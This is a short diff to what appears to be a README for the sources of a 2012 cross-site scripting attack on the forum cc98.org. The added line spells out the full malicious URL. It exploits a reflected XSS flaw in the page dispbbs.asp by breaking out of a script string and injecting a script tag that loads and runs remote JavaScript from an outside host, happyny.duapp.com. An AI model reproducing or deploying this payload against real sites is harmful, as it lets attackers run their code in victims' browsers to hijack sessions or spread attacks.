@@ -1,1 +1,2 @@
 This is the sources for the XSS attack in 2012.12.31 at cc98.org, taking advantage of a reflection xss in /dispbbs.asp?Boardid=507&ID=290147";}$VECTOR$;function%20ttt{//
+full url is http://www.cc98.org/dispbbs.asp?Boardid=507&ID=290147%22;}var%20s=%20document.createElement(%22Script%22);%20s.type%20=%20%22text/javascript%22;%20s.src%20=%20%22http://happyny.duapp.com/hi.php%22;document.body.appendChild(s);function%20ttt(){//
